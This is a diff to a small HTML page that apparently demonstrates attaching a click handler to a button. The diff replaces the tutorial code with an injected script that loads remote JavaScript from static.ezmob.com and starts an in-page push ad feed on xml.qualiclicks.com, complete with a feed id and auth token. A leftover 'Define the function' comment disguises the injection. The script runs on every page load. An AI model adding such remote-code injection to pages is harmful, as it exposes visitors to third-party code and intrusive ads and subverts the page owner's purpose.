@@ -61,12 +61,28 @@
     <button id="myButton">Click me</button>
     <script>
         // Define the function
-        function myFunction() {
-            alert('Hello, this is a function attached using an event listener!');
-        }
-
-        // Attach an event listener to the button
-        document.getElementById('myButton').addEventListener('click', myFunction);
+        (function(i,n,p,a,g,e){
+i.inpagepush = i.inpagepush || function() {
+(i.inpagepush.q=(i.inpagepush.q||[])).push(arguments)
+};
+var s=n.getElementsByTagName('head')[0];
+var q=n.createElement('script'); q.async=1;
+q.src='//static.ezmob.com/inpage/inpage.js';
+s.appendChild(q);
+i.inpagepush('init', {
+host: 'xml.qualiclicks.com',
+feed: 685549,
+auth : 'GgSQjX',
+subid: 'site1',
+refresh: 90,
+position: 'top',
+position_mobile: 'top',
+slots: 2,
+query : '',
+nodesrc : true
+});
+i.inpagepush('show');
+})(window, document);
     </script>
 
 </body>
